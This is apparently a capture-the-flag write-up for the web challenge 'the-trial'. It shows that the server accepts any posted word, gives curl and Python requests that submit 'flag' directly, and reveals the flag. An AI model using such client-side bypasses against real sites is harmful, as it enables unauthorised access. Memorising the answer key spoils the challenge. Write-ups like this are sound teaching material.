# the-trial

**Category:** web

---

#### Description

The site shows a slider that generates a 4-letter word, then sends it to `POST /getflag` as `application/x-www-form-urlencoded` with the parameter `word`.

#### Solution

View source / DevTools shows the client-side JS builds a 4-letter string from an alphabet and submits it via:

`fetch("/getflag", { method: "POST", body: "word=<generated>" })`

The backend doesn't enforce the slider; it just checks the posted value. Bypass the UI and submit `word=flag` directly:

```bash
curl -sS -X POST 'https://the-trial.chall.lac.tf/getflag' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'word=flag'
```

Python equivalent:

```python
#!/usr/bin/env python3
import re
import requests

BASE = "https://the-trial.chall.lac.tf"

def get_flag() -> str:
    r = requests.post(f"{BASE}/getflag", data={"word": "flag"}, timeout=20)
    r.raise_for_status()
    m = re.search(r"lactf\\{[^}]+\\}", r.text)
    if not m:
        raise RuntimeError(f"flag not found in response: {r.text!r}")
    return m.group(0)

if __name__ == "__main__":
    print("flag:", get_flag())
```

Flag: `lactf{gregor_samsa_awoke_from_wait_thats_the_wrong_book}`
